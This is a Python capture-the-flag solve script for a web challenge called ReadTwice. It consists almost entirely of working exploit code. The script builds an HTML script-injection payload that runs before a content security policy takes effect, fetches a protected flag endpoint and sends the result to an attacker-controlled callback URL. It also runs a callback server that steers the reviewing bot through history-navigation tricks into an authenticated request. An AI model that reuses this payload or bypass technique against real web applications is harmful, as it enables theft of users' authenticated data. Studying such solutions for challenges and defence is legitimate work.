#!/usr/bin/env python3
"""ReadTwice exploit and callback server.

Example local run (app on 127.0.0.1:3000):
  python3 solve.py http://127.0.0.1:3000 http://127.0.0.1:4000

For the remote instance, PUBLIC_URL must be an Internet-reachable URL that
forwards to LISTEN_HOST:LISTEN_PORT.
"""

import argparse
import base64
import html
import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, quote, urlparse

import requests


class State:
    def __init__(self, app_url: str, public_url: str, bot_app_url: str):
        self.app_url = app_url.rstrip("/")
        self.public_url = public_url.rstrip("/")
        self.bot_app_url = bot_app_url.rstrip("/")
        self.get_counts = {}
        self.leak = None
        self.leak_event = threading.Event()


def make_payload(public_url: str) -> str:
    # A template-for patch deletes the PI-delimited script after parsing.  The
    # script nevertheless executes before the later meta CSP when JS is on.
    js = (
        "onmessage=e=>e.ports[0].postMessage('ready');"
        "top==self&&fetch('/api/flag').then(r=>r.text()).then(x=>"
        f"location='{public_url}/leak?d='+encodeURIComponent(btoa(x)))"
    )
    payload = (
        '<!doctype html><head><?start name="x"><script>' + js +
        '</script><?end><meta http-equiv="content-security-policy" '
        'content="default-src \'none\'"></head><body>'
        '<template for=x></template><div></div>'
    )
    if len(payload) > 512:
        raise ValueError(f"note payload is {len(payload)} code points (limit 512)")
    return payload


def handler_factory(state: State):
    class Handler(BaseHTTPRequestHandler):
        server_version = "readtwice-solver"

        def log_message(self, fmt, *args):
            print(f"[callback] {self.address_string()} {fmt % args}", flush=True)

        def send_html(self, body: str, status=200, headers=None):
            raw = body.encode()
            self.send_response(status)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "no-store")
            for k, v in (headers or {}).items():
                self.send_header(k, v)
            self.end_headers()
            self.wfile.write(raw)

        def do_GET(self):
            url = urlparse(self.path)
            query = parse_qs(url.query)
            if url.path == "/leak":
                try:
                    raw = base64.b64decode(query.get("d", [""])[0]).decode()
                except Exception as exc:
                    raw = f"decode error: {exc}"
                state.leak = raw
                state.leak_event.set()
                print(f"[+] exfiltrated response: {raw}", flush=True)
                return self.send_html("ok")

            if url.path != "/go":
                return self.send_html("not found", 404)

            rid = query.get("rid", [""])[0]
            note = query.get("note", [""])[0]
            state.get_counts[rid] = state.get_counts.get(rid, 0) + 1

            # A history traversal reload has Fetch Metadata Site=none. Redirect
            # that second GET while it is still part of the UI/history-initiated
            # navigation, preserving Site=none on /reports/check.
            if rid and state.get_counts[rid] >= 2:
                # The reviewer's authenticated cookie is scoped to APP_URL,
                # which is normally http://localhost:3000 inside the container,
                # not the public challenge hostname used by the solver client.
                target = f"{state.bot_app_url}/reports/check?rid={quote(rid)}"
                self.send_response(302)
                self.send_header("Location", target)
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                print(f"[+] history GET -> {target}", flush=True)
                return

            review = f"{state.bot_app_url}/review?rid="
            body = f"""<!doctype html><script>
const rid=new URL(location).searchParams.get('rid');
open({json.dumps(review)}+encodeURIComponent(rid),'review');
setTimeout(()=>{{
  const f=document.createElement('form');
  f.method='POST'; f.action=location.href+'#phase2';
  document.body.append(f); f.submit();
}},6000);
</script><p>reviewing {html.escape(note)}</p>"""
            return self.send_html(body)

        def do_POST(self):
            url = urlparse(self.path)
            if url.path != "/go":
                return self.send_html("not found", 404)
            size = int(self.headers.get("Content-Length", "0"))
            if size:
                self.rfile.read(size)
            # This cross-document POST makes the initial GET a real history
            # entry. Traversing back re-requests it because it was no-store.
            return self.send_html(
                "<!doctype html><script>setTimeout(()=>history.back(),300)</script>"
            )

    return Handler


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("app_url")
    ap.add_argument("public_url")
    ap.add_argument(
        "--bot-app-url",
        help="APP_URL as seen by the reviewer (remote default: http://localhost:3000)",
    )
    ap.add_argument("--listen-host", default="0.0.0.0")
    ap.add_argument("--listen-port", type=int, default=4000)
    args = ap.parse_args()

    state = State(args.app_url, args.public_url, args.bot_app_url or args.app_url)
    server = ThreadingHTTPServer(
        (args.listen_host, args.listen_port), handler_factory(state)
    )
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] callback listening on {args.listen_host}:{args.listen_port}")

    payload = make_payload(state.public_url)
    print(f"[*] payload length: {len(payload)}")
    create = requests.post(
        state.app_url + "/create",
        data={"title": "proof", "html": payload},
        allow_redirects=False,
        timeout=15,
    )
    if create.status_code != 302 or "/note/" not in create.headers.get("Location", ""):
        raise SystemExit(
            f"create failed: HTTP {create.status_code}: {create.text[:300]}"
        )
    note_id = create.headers["Location"].rsplit("/", 1)[-1]
    print(f"[+] accepted note: {note_id}")

    report_url = f"{state.public_url}/go?note={quote(note_id)}"
    print(f"[*] reporting: {report_url}")
    reviewed = requests.post(
        state.app_url + "/report", data={"url": report_url}, timeout=20
    )
    print(f"[*] report returned HTTP {reviewed.status_code}")

    state.leak_event.wait(3)
    server.shutdown()
    if not state.leak:
        raise SystemExit("exploit completed without a leak")
    print(state.leak)


if __name__ == "__main__":
    main()
